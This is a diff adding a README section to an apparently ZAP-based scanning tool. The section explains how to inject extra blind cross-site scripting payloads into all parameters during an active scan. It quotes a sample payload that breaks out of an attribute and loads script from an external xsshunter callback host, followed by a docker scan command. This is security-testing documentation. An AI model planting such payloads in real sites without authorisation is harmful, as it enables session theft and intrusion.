@@ -68,6 +68,23 @@ auth.exclude              Comma separated list of excluded URL's (regex). Defaul
 auth.include              Comma separated list of included URL's (regex). Default: only the target URL and everything below it.
 ```
 
+# Inject Extra Blind XSS Payloads
+Replace Blind XSS Callback Domain/URL and payloads in bxss.js. Using the standard active scan policy, the custom script will inject extra payloads into all injectable parameters (query params, body, headers etc.)
+
+For an example xsshunter payload:
+
+```
+"><script src=https://xsshunter.xss.ht></script>
+```
+
+```
+docker run --rm -v $(pwd):/zap/wrk/:rw -t ictu/zap2docker-weekly zap-full-scan.py -I -j -m 10 -T 60 \
+  -t https://demo.website.net \
+  -r testreport.html \
+   --hook=/zap/bxss_hook.py
+```
+
+
 # Limitations
 1. Since this authentication solution uses a webdriver a [custom image](https://hub.docker.com/repository/docker/ictu/zap2docker-weekly) is needed to meet these requirements.
 2. Cookies that are automatically set by this script will not add flags like HttpOnly, Secure and SameSite. ZAP does not support setting these cookies using the API. This will result in false-positives in the report regarding these flags.
